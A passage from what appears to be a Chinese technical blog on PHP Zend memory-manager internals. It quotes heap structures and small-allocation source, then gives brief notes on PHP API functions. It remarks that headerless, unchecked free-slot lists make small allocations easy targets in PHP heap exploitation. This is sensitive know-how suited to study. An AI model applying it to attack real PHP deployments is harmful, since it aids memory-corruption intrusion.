一次内存分配的段大小，即ZEND_MM_SEG_SIZE指定的大小，默认为ZEND_MM_SEG_SIZE   (256 * 1024)*/</span></span><br><span class="line">    <span class="type">size_t</span>              compact_size;   <span class="comment">/* 压缩操作边界值，为ZEND_MM_COMPACT指定大小，默认为 2 * 1024 * 1024*/</span></span><br><span class="line">    zend_mm_segment    *segments_list;  <span class="comment">/* 段指针列表 */</span></span><br><span class="line">    zend_mm_storage    *storage;    <span class="comment">/* 所调用的存储层 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_size;  <span class="comment">/* 堆的真实大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_peak;  <span class="comment">/* 堆真实大小的峰值 */</span></span><br><span class="line">    <span class="type">size_t</span>              limit;  <span class="comment">/* 堆的内存边界 */</span></span><br><span class="line">    <span class="type">size_t</span>              size;   <span class="comment">/* 堆大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              peak;   <span class="comment">/* 堆大小的峰值*/</span></span><br><span class="line">    <span class="type">size_t</span>              reserve_size;   <span class="comment">/* 备用堆大小*/</span></span><br><span class="line">    <span class="type">void</span>               *reserve;    <span class="comment">/* 备用堆 */</span></span><br><span class="line">    <span class="type">int</span>                 overflow;   <span class="comment">/* 内存溢出数*/</span></span><br><span class="line">    <span class="type">int</span>                 internal;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CACHE</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        cached; <span class="comment">/* 已缓存大小 */</span></span><br><span class="line">    zend_mm_free_block *cache[ZEND_MM_NUM_BUCKETS]; <span class="comment">/* 缓存数组/</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">    zend_mm_free_block *free_buckets[ZEND_MM_NUM_BUCKETS*2];    /* 小块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *large_free_buckets[ZEND_MM_NUM_BUCKETS];    <span class="comment">/* 大块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *rest_buckets[<span class="number">2</span>];    <span class="comment">/* 剩余内存数组*/</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PHP中的内存管理主要工作就是维护三个列表：<strong>小块内存列表（free_buckets）、大块内存列表（large_free_buckets）和剩余内存列表（rest_buckets）。</strong></p><p>在内存管理初始化时，PHP内核对初始化free_buckets列表。从heap的定义我们可知free_buckets是一个数组指针，其存储的本质是指向zend_mm_free_block结构体的指针。开始时这些指针都没有指向具体的元素，只是一个简单的指针空间。free_buckets列表在实际使用过程中只存储指针，这些指针以两个为一对（即数组从0开始，两个为一对,就像ptmalloc2的bins），分别存储一个个双向链表的头尾指针。其结构如图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160932.png" alt=""></p><p>free_buckets列表的作用是存储小块内存，而与之对应的large_free_buckets列表的作用是存储大块的内存，虽然large_free_buckets列表也类似于一个hash表，但是这个与前面的free_buckets列表一些区别。它是一个集成了数组，树型结构和双向链表三种数据结构的混合体。我们先看其数组结构，数组是一个hash映射，其hash函数为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">zend_mm_high_bit</span><span class="params">(<span class="type">size_t</span> _size)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">..<span class="comment">//省略若干不同环境的实现</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (_size != <span class="number">0</span>) &#123;</span><br><span class="line">        _size = _size &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个hash函数用来计算size中最高位的1的比特位是多少，这点从其函数名就可以看出。假设此时size为512Byte，则这段内存会放在large_free_buckets列表，512的二进制码为1000000000，则zend_mm_high_bit(512)计算的值为9，则其对应的列表index为9。关于右移操作，这里有一点说明</p><p>large_free_buckets列表的结构如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_162042.png" alt=""></p><h4 id="新"><a href="#新" class="headerlink" title="新"></a>新</h4><p>新版才是现在的主流,我们主要关注这个</p><p>新zend内存分配有三种模式</p><ul><li>small:&lt;=3KB的内存</li><li>large:3KB小于等于(2MB减去4KB)内存</li><li>huge:大于2MB减去4KB内存</li></ul><p>内存数据结构:<br>全局变量alloc_globals.mm_heap指向zend_mm_heap数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of alocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chunk数据结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;<span class="comment">//AG()里的mm_heap地址</span></span><br><span class="line">zend_mm_chunk     *next;<span class="comment">//下一个trunk</span></span><br><span class="line">zend_mm_chunk     *prev;<span class="comment">//之前的trunk</span></span><br><span class="line"><span class="type">int</span>                free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">int</span>                free_tail;               <span class="comment">/* number of free pages at the end of chunk </span></span><br><span class="line"><span class="comment">    最后一块连续可用的page*/</span></span><br><span class="line"><span class="type">int</span>                num; <span class="comment">//当前chunk的序号</span></span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* 只用于mainchunk used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 空闲页的位图512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 存储每个页的使用信息,高两位代表使用内存的类型,低十位区分是否连续的页 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个chunk管理512个页,也就是2m(4096*512)的内存,一个chunk中的页可以用于满足多种大小的分配</p><p><strong>内存分配逻辑</strong></p><p><strong>huge</strong></p><p><strong>分配</strong><br>1.申请size需要根据page_size进行对齐<br>2.对齐后的size再根据chunk_size大小进行对齐<br>3.将内存挂载到alloc_global.mm_heap-&gt;huge_list上</p><p><strong>释放:</strong> 从huge_list链表中删除,调用munmap释放.</p><p><strong>large</strong></p><p>large分配是page分配的整数倍.</p><p>1.遍历双向链表alloc_global.mm_heap-&gt;main_trunk<br>2.如果free_pages小于要申请的页的个数回到1.<br>3.根据zend_mm_chunk-&gt;free_map查找最优连续page(连续page个数最少,连续page编号最少).<br>4.如果查找可分配的页则返回对应的地址,并将map[page_num]标记为large内存<br>5.如果chunk都没有可分配内存,就新申请一个chunk,在进行分配.</p><p><strong>释放:</strong><br>将zend_mm_chunk-&gt;free_map[page_num],zend_mm_chunk-&gt;map[page_num]置为0.<br>然后修改free_pages.如果pages都释放,那么释放chunk.</p><h3 id="small分配路径"><a href="#small分配路径" class="headerlink" title="small分配路径"></a>small分配路径</h3><p><a href="https://zhuanlan.zhihu.com/p/41622782">【PHP7源码分析】PHP内存管理（上） - 知乎 (zhihu.com)</a>,这篇文章很不错</p><p><strong>small</strong>分配在php内存利用中是比较轻易的,因为其并没有足够的检查</p><p>small类型共分为<strong>30种不同的大小</strong>.规格如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；#define ZEND_MM_BINS_INFO(_, x, y) \</span></span><br><span class="line"><span class="comment">    _( 0,    8,  512, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 1,   16,  256, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 2,   24,  170, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 3,   32,  128, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 4,   40,  102, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 5,   48,   85, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 6,   56,   73, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 7,   64,   64, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 8,   80,   51, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 9,   96,   42, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(10,  112,   36, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(11,  128,   32, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(12,  160,   25, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(13,  192,   21, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(14,  224,   18, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(15,  256,   16, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(16,  320,   64, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(17,  384,   32, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(18,  448,    9, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(19,  512,    8, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(20,  640,   32, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(21,  768,   16, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(22,  896,    9, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(23, 1024,    8, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(24, 1280,   16, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(25, 1536,    8, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(26, 1792,   16, 7, x, y) \</span></span><br><span class="line"><span class="comment">    _(27, 2048,    8, 4, x, y) \</span></span><br><span class="line"><span class="comment">    _(28, 2560,    8, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(29, 3072,    4, 3, x, y)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ZEND_ALLOC_SIZES_H */</span></span></span><br></pre></td></tr></table></figure><p>zendmm中chunk的含义和ptmalloc2中不太相同,我这里将<u>管理同一大小</u>的一个或多个页称为small_frame</p><p><u>一个small_frame上所有空闲的块全都被链在一个单链表上</u>,采用<u>lifo</u>的方式管理,链表头由mm_heap-&gt;free_slot数组维护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要用于分配small_frame时构建small链。它解释了 30 条单链是如何构建的。</p><p>因为链的每个部分不必包含有关其大小的标头，只留下 next字段,组织形式有点像glibc的fastbin或tcachebin,甚至更危险因为其甚至没有块头,这显然是极其危险的</p><p>与ptmalloc2不同,其没有一个top_chunk管理所有尚未使用区域,而是像slab分配器那样,所有空闲的块全部组织在链上,但不同的是,zendmm没有slab那么多的保护机制</p><p><strong>alloc</strong>时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>根据申请的内存查找对应的规格表</p></li><li><p>根据规格表中的num,如果mm_heap-&gt;free_slot[num]为空则继续下一步,如果不为空返回对应的地址,并从mm_heap-&gt;free_slot[num]指向链表的首地址删除</p></li><li><p>申请的规格表中对应的页数(bin_pages[bin_num])并更新mm_chunk-&gt;map[page_num]<u>标识位为small内存</u>.</p><p>第一个页需要设置mappage_num(位于map的24bit-16bit位段)设置free_slot个数.接下的连续页的标志位给予顺序标志(位于map的24bit-16bit位段).</p></li></ol><p><strong>释放时:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接插入mm_heap-&gt;free_slot当中.</p><h2 id="常用接口函数"><a href="#常用接口函数" class="headerlink" title="常用接口函数"></a>常用接口函数</h2><h3 id="zend-parse-paramenters"><a href="#zend-parse-paramenters" class="headerlink" title="zend_parse_paramenters"></a>zend_parse_paramenters</h3><p>函数原型</p><p><code>int zend_parse_parameters(int num_args, const char *type_spec, ...);</code></p><p><code>zend_parse_parameters</code> 解析参数，第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 </p><p>第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为PHP采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。</p><div class="table-container"><table><thead><tr><th>参数</th><th>代表着的类型</th></tr></thead><tbody><tr><td>b</td><td>Boolean</td></tr><tr><td>l</td><td>Integer</td></tr><tr><td>d</td><td>Float</td></tr><tr><td>s</td><td>String</td></tr><tr><td>r</td><td>Resource</td></tr><tr><td>a</td><td>Array</td></tr><tr><td>o</td><td>Object</td></tr><tr><td>O</td><td>特定类型的Object</td></tr><tr><td>z</td><td>任意类型</td></tr><tr><td>Z</td><td>zval**类型</td></tr><tr><td>f</td><td>表示函数、方法名称</td></tr></tbody></table></div><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是<code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。</p><h3 id="string相关"><a href="#string相关" class="headerlink" title="string相关"></a>string相关</h3><h4 id="str-pad"><a href="#str-pad" class="headerlink" title="str_pad"></a>str_pad</h4><p>填充字符串到指定长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">str_pad</span>(<span class="keyword">string</span> <span class="variable">$input</span>, <span class="keyword">int</span> <span class="variable">$pad_length</span>, <span class="keyword">string</span> <span class="variable">$pad_string</span> = <span class="string">&quot; &quot;</span>, <span class="keyword">int</span> <span class="variable">$pad_type</span> = STR_PAD_RIGHT): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$input</code>：要填充的字符串。</li><li><code>$pad_length</code>：填充后的字符串长度。</li><li><code>$pad_string</code>：可选，用于填充的字符，默认为空格。</li><li><code>$pad_type</code>：可选，填充类型，默认为 <code>STR_PAD_RIGHT</code>，还可以是 <code>STR_PAD_LEFT</code> 或 <code>STR_PAD_BOTH</code>。</li></ul><h4 id="str-repeat"><a href="#str-repeat" class="headerlink" title="str_repeat"></a>str_repeat</h4><p><code>str_repeat()</code> 是 PHP 中的一个内置函数，用于重复一个字符串若干次。</p><p>它的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">str_repeat</span> ( <span class="keyword">string</span> <span class="variable">$input</span> , <span class="keyword">int</span> <span class="variable">$multiplier</span> )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$input</code>：要重复的字符串。</li><li><code>$multiplier</code>：重复的次数，必须是一个整数</li></ul><h3 id="输出缓冲区"><a href="#输出缓冲区" class="headerlink" title="输出缓冲区"></a>输出缓冲区</h3><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p><code>ob_start()</code> 是 PHP 中的一个内置函数，用于启动输出缓冲。当启用输出缓冲后，所有后续的输出不会直接发送到客户端，而是存储在内存中的缓冲区中，直到缓冲区被刷新或关闭。</p><p><code>ob_start()</code> 函数的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 